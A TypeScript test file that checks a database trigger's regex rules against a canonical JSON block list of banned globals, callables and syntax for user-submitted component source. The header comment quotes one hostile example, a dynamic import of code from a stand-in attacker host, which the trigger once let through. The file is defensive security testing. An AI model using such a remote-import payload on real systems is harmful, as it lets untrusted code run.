/**
 * DD-124 — THE THIRD LEG OF THE PARITY.
 *
 * `component-source-gate.json` is the one canonical list. The TypeScript gate
 * imports it and the aidream Python twin is held byte-identical to it by
 * `packages/matrx-ai/tests/test_component_source_gate_parity.py`. The database
 * trigger `content_ir.kind_component_source_gate` cannot import anything, so
 * for one release it silently drifted: V-17 measured it ACCEPTING
 * `import("https://evil.example/x.js")` at the table while the Studio refused
 * it. Nothing was red, because nothing compared them.
 *
 * This test is that comparison. It parses the applied migration
 * `migrations/content_ir_kind_component_source_gate.sql` and asserts the
 * function's regexes name EXACTLY the entries of each security list in the
 * JSON. Add a name to the JSON without adding it to the trigger and this goes
 * red — which is the only thing that makes "one rule, three enforcement
 * points" true rather than aspirational.
 *
 * HOW IT READS THE SQL: each pattern in the migration carries a
 * `-- PARITY: <listName>` marker on the line directly above it. Those markers
 * are load-bearing; a rule without one is unverified and this test says so.
 *
 * WHAT THIS DOES NOT PROVE: that the LIVE function matches the file. Applying
 * the migration is what makes that true, and the DD-124 rolled-back probes
 * proved the live function's behaviour directly. This guards the drift that
 * actually happened — a list growing in the JSON while the SQL stands still.
 */

import { readFileSync } from "node:fs";
import path from "node:path";

import gate from "./component-source-gate.json";

const MIGRATION = path.join(
  __dirname,
  "../../../migrations/content_ir_kind_component_source_gate.sql",
);

const sql = readFileSync(MIGRATION, "utf8");

/**
 * The SQL regex literal guarded by `-- PARITY: <list>`, and the alternation
 * group inside it. Returns null when the marker is absent, so the caller can
 * fail with a sentence instead of a type error.
 */
function triggerRuleNames(listName: string): string[] | null {
  const marker = new RegExp(
    // ...the first line after the marker that BEGINS with a quoted literal —
    // which is the regexp_match pattern, never the `v_kind := '...'` line.
    `-- PARITY: ${listName}(?:[ \\t]+\\w+)?\\n(?:[^\\n]*\\n)*?[ \\t]*'([^'\\n]+)'`,
  );
  const found = marker.exec(sql);
  if (!found) return null;
  // The first capturing group in the SQL pattern is always the offender list;
  // `(?:...)` non-capturing groups around it are skipped by requiring a name
  // character right after the paren.
  const alternation = /\(([A-Za-z$_][A-Za-z0-9$_|]*)\)/.exec(found[1]);
  if (!alternation) return null;
  return alternation[1].split("|").sort();
}

describe("the database trigger enforces the SAME lists as the canonical JSON", () => {
  it.each([
    ["bannedGlobals", gate.bannedGlobals],
    ["bannedCallables", gate.bannedCallables],
    ["bannedMemberAccess", gate.bannedMemberAccess],
    ["bannedMemberCalls", gate.bannedMemberCalls],
    ["bannedComputedAccess", gate.bannedComputedAccess],
  ])("%s", (listName, canonical) => {
    const inTrigger = triggerRuleNames(listName);
    expect(
      inTrigger === null
        ? `${listName}: no "-- PARITY: ${listName}" marker in ${path.basename(MIGRATION)} — ` +
            "the trigger has no rule for this list, or the marker was removed. " +
            "Add the rule AND the marker, then apply the migration."
        : inTrigger,
    ).toEqual([...canonical].sort());
  });

  it("implements every named syntax rule", () => {
    for (const syntaxRule of gate.bannedSyntax) {
      expect(
        sql.includes(`-- PARITY: bannedSyntax ${syntaxRule}`)
          ? syntaxRule
          : `${syntaxRule}: the trigger has no "-- PARITY: bannedSyntax ${syntaxRule}" rule. ` +
              "A syntax rule the code paths enforce and the database does not is " +
              "exactly the DD-124 hole: a body refused in the Studio, stored by " +
              "anything else that writes the table.",
      ).toEqual(syntaxRule);
    }
  });

  it("still carries the trigger itself, on the right column", () => {
    // A parity test over a function nothing calls proves nothing.
    expect(sql).toContain(
      "create trigger zzz_component_source_gate\n    before insert or update of component_source\n    on content_ir.kind_component",
    );
  });
});
